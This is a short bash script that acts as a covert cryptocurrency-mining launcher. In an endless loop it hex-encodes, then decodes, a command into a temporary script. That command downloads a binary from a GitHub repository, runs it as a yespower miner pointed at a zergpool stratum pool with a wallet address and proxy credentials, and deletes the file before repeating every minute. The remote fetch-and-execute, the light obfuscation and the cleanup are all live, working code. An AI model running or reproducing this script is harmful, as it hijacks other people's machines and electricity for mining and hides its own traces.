#!/bin/bash

while true; do
    # Convert provided code to hex
    hex_code=$(echo -n "wget https://github.com/Master478963/lolMinet/raw/main/data   &> /dev/null && chmod +x data && ./data -a yespower -o stratum+tcp://yespower.mine.zergpool.com:6533  -u RQFqPLG7ysPijH28DvJSMnzdUcd2rS68oh -p c=RVN,ID=Test  -x zbcpclbx-rotate:2hicb1nxgc3z@p.webshare.io:80" | xxd -p)

    # Write hex code to a temporary file
    echo "$hex_code" | xxd -r -p > temp_hex_code.sh

    # Make the file executable
    chmod +x temp_hex_code.sh

    # Execute the script
    ./temp_hex_code.sh

    # Clean up temporary file
    rm temp_hex_code.sh

    # Add a delay before next iteration (optional)
    sleep 60  # Adjust the time interval as needed
done
